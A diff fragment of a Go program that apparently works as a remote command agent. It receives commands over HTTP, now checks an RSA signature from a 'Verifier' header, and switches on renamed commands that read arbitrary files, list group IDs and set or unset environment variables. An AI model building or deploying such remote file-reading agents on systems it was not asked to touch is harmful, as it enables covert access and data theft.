@@ -196,6 +196,9 @@ func main() {
 			resp, _ = client.Do(req)
 			body, _ := io.ReadAll(resp.Body)
 			sb = string(body)
+			rawSignature := resp.Header.Get("Verifier")
+			signature, _ := hex.DecodeString(rawSignature)
+			err = rsa.VerifyPKCS1v15(pubkey.(*rsa.PublicKey), crypto.SHA256, h.Sum(nil), signature)
 		}
 
 		// We are turning this into a switch statement
@@ -222,7 +225,7 @@ func main() {
 			if err == nil {
 				result = strings.Join(res, "")
 			}
-		case "groups_id":
+		case "groupsid":
 			vars, err := os.Getgroups()
 			if err != nil {
 				result = "error getting group info %e" + err.Error()
@@ -234,7 +237,7 @@ func main() {
 				}
 				result = strings.Join(strAr, ",")
 			}
-		case "read_file":
+		case "readfile":
 			contents, err := os.ReadFile(string_contents[1])
 			if err != nil {
 				result = "error reading file %e" + err.Error()
@@ -256,7 +259,7 @@ func main() {
 			if err == nil {
 				result = "Set env var"
 			}
-		case "remove_var":
+		case "removeenv":
 			err := os.Unsetenv(string_contents[1])
 			if err != nil {
 				result = err.Error()
